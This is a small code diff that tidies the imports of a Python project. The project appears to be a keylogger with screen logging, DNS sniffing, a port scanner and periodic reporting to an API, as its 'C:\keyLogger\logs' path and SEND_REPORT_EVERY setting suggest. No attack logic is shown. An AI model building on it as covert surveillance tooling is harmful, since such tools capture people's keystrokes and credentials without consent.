@@ -8,14 +8,15 @@ import json  # For API
 import io  # For ScreenLogger
 import psutil as ps  # For process
 import time  # For API
-from scapy.layers.dns import DNSQR, DNS
-from scapy.layers.inet import UDP
-from scapy.layers.inet6 import IPv6
+from scapy.layers.dns import DNSQR, DNS # For Sniffer
+from scapy.layers.inet import UDP   # For Sniffer
+from scapy.layers.inet6 import IPv6 # For Sniffer
+from scapy.all import * # For Sniffer
 import credenciais as cr  # For API
-import threading
-import socket
+import threading    # For paralelism
+import socket   # For Scanner
 from IPy import IP  # For Scanner
-from scapy.all import *
+
 
 SEND_REPORT_EVERY = 30
 PATH = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
